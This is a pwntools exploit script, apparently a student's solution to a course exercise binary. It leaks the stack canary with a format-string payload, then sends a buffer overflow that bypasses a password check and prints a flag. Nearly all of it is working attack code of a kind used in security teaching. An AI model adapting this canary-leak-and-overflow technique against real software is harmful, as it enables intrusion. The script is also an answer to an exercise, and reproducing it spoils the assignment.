#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise5/exercise5a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
# pause()

print(r.recvline())        # Enter password for user

payload = b"%7$08x"
print(f"Sending: {payload}")
r.sendline(payload)        # Send password

st = r.recvline()          # can_val is not the password
print(f"received_line: {st}")

canary_val = st[:st.index(b'i')]
canary_val = int(canary_val, 16)
print(f"received_canary: {hex(canary_val)}")

print(r.recvline())        # Enter password for user

payload = b"A"*256
payload+=p32(canary_val)
payload+=p32(1)
payload+=b"A"*4
payload+=p32(152)
print(f"Sending: {payload}")
r.sendline(payload)        # Send password

print(r.recvline())          # AAAAA.. is not the password
print(r.recvline())          # Authorized
print(r.recvline())          # FLAG